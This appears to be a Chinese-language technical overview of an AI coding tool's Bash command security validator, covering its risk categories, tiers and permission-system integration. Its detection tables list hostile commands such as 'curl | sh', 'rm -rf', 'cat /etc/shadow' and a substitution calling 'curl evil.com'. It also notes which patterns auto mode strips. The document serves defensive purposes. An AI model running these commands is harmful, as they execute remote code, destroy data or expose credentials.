# Bash 安全机制

## 概述

`src/tools/BashTool/bashSecurity.ts` 是一个 **2,592 行** 的安全校验器，在每条 shell 命令执行前对其进行分析。它是代码库中最复杂的单一安全文件。

## 关键文件

| 文件路径 | 行数 | 职责 |
|-----------|-------|------|
| `src/tools/BashTool/bashSecurity.ts` | 2592 | 命令分析、模式匹配、风险分级 |

## 分析方法

校验器对每条命令执行多轮分析：

### 1. 命令解析
- 将命令拆分为各个组成部分
- 处理管道、重定向、子 shell、命令替换
- 解析别名和 shell 内建命令

### 2. 模式匹配

命令按类别匹配对应模式：

| 类别 | 示例 | 风险等级 |
|------|------|----------|
| 破坏性操作 | `rm -rf`、`mkfs`、`dd` | Critical |
| 网络操作 | `curl \| sh`、`wget -O- \| bash` | Critical |
| 持久化 | `crontab`、`systemctl enable` | High |
| 权限提升 | `sudo`、`su`、`chmod +s` | High |
| 信息泄露 | `env`、`printenv`、`cat /etc/shadow` | Medium |
| 包管理 | `npm install -g`、`pip install` | Medium |

### 3. 复合命令分析

处理复杂的命令结构：
- 管道：`cat file | sh`（通过管道执行代码）
- 重定向：`echo "malicious" > /etc/hosts`
- 命令替换：`` `curl evil.com` ``
- 后台执行：`nohup malicious &`

### 4. 解释器检测

检测 23 种跨平台解释器模式：
```
python, python3, node, ruby, perl, php, lua,
bash, sh, zsh, fish, dash, csh, tcsh, ksh,
powershell, pwsh, osascript, wscript, cscript,
deno, bun, tsx
```

以解释器前缀开头的命令会被标记，因为它们可以从字符串或 URL 执行任意代码。

## 风险分级

每条分析过的命令会获得一个风险等级：

| 等级 | 处理方式 |
|------|----------|
| `safe` | 自动允许 |
| `needs_review` | 发送给 YOLO classifier（auto mode）或提示用户确认 |
| `dangerous` | 始终提示用户确认，即使在 auto mode 下 |
| `blocked` | 无论何种模式一律拒绝 |

## 与 Permission System 的集成

```
用户执行 Bash 命令
  → bashSecurity.ts 分析命令
    → 返回风险等级
      → Permission system 应用规则
        → YOLO classifier（若为 auto mode 且 needs_review）
          → 执行或拒绝
```

## 仅限内部的模式

Anthropic 内部构建版本（ant-only）包含针对基础设施工具的额外模式：
- `gh api` -- GitHub API 调用
- `curl` -- 任意 HTTP 请求
- `kubectl` -- Kubernetes 集群访问
- `aws` -- AWS CLI
- 另有 8 种基础设施模式

进入 auto mode 时，这些模式会从 permission rules 中被剥离（`dangerousPatterns.ts`）。
